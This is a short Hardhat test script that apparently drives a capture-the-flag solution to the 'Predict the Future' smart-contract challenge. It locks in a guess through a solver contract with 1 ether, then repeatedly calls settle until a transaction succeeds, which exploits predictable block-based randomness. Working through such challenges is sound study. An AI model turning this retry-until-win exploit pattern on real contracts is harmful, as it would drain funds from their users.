import { ethers } from "hardhat"

describe("predict-the-future", function () {
  it("should predict the future", async function () {
    const chalAddr = ""
    const solAddr = ""

    const sol = await ethers.getContractAt("PredictTheFutureChallengeSolver", solAddr)
    const tx = await sol.lockInGuess(chalAddr, {value: ethers.utils.parseEther("1")})
    const rx = await tx.wait()

    while (true) {
      const block = await ethers.provider.getBlock(rx.blockNumber + 1)
      if (block !== null)
        break
    }

    while (true) {
      const tx = await sol.settle(chalAddr)
      try {
        const rx = await tx.wait()
        break
      } catch (_) {
      }
    }
  })
})